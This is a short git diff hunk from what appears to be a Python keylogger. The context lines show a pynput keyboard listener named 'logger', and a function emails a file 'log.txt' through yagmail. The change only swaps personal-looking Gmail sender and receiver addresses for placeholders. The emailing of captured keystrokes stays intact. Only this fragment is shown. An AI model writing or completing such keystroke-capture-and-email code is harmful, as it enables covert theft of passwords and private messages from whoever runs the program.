@@ -29,11 +29,11 @@ with Listener(on_press=anonymous) as logger:
 	logger.join()
 
 def func():
-	receiver = "nhatminh.28112010@gmail.com"
+	receiver = "receiver@gmail.com"
 	body = ""
 	filename = "log.txt"
 
-	yag = yagmail.SMTP("memail1512@gmail.com")
+	yag = yagmail.SMTP("sender@gmail.com")
 	yag.send(
 		to=receiver,
 		subject="",
